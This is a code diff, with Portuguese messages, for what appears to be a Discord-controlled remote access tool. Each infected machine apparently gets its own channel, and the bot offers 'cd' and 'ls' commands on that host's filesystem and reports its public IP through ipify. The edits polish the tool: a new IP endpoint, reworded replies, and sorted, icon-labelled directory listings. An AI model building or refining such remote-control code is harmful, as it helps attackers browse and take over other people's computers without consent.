@@ -34,7 +34,7 @@ def random_wait():
 
 def get_public_ip():
     try:
-        with urllib.request.urlopen("https://api64.ipify.org") as response:
+        with urllib.request.urlopen("https://api.ipify.org") as response:
             return response.read().decode().strip()
     except:
         return "IP não disponível"
@@ -208,7 +208,7 @@ async def cd(interaction: discord.Interaction, path: str):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
 
 
-@bot.tree.command(name="ls", description="Lista os arquivos e diretórios no path atual.")
+@bot.tree.command(name="ls", description="Lista os arquivos e pastas no path atual.")
 async def ls(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
@@ -217,9 +217,19 @@ async def ls(interaction: discord.Interaction):
             path_atual = os.getcwd()
             conteudo = os.listdir(path_atual)
             if not conteudo:
-                await interaction.followup.send(f"📁 Path `{path_atual}` está vazio.")
+                await interaction.followup.send(f"📁 Diretório `{path_atual}` está vazio.")
                 return
-            resposta = "\n".join(conteudo)
+            
+            # Organiza o conteudo da dir por tipo para melhor visualizaçao
+            lines = []
+            for item in sorted(conteudo):
+                full_path = os.path.join(path_atual, item)
+                if os.path.isdir(full_path):
+                    lines.append(f"📁 {item}/")
+                else:
+                    lines.append(f"📄 {item}")
+            resposta = "\n".join(lines)
+
             if len(resposta) > 1900:
                 with open("dir_list.txt", "w", encoding="utf-8") as f:
                     f.write(resposta)
